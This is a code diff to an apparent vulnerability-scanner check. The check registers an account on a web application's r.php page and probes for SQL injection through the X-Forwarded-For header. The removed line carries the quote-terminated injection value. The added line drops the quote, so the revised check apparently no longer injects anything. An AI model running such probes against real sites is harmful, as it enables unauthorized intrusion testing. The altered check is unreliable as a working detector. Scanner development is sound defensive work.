@@ -38,11 +38,12 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg + "./r.php?qlang=cn&qid=&step=1"
             mail = "testvul" + str(random.randint(1000, 9999)) + "@testvul.net"
-            header = "X-Forwarded-For: 1.1.1.1'\r\n"
+            header = {
+                "X-Forwarded-For": "1.1.1.1"
+            }
             data = 'administrators_Name='+mail+'&nickName=testvul&passWord=123456&passWord2=123456&hintPass=3&answerPass=testvul&Action=MemberAddSubmit&submit=%D7%A2%B2%E1&qid='
-            code, head, res, errcode,finalurl = hh.http(url + ' -H "' +header +'"' + " -d " + data)
-                       
-            if res.find("Bad SQL Query") != -1 and res.find("administratorsName") != -1:
+            res= requests.post(url, headers=header, data=data)
+            if "Bad SQL Query" in res.text  and "administratorsName" in res.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
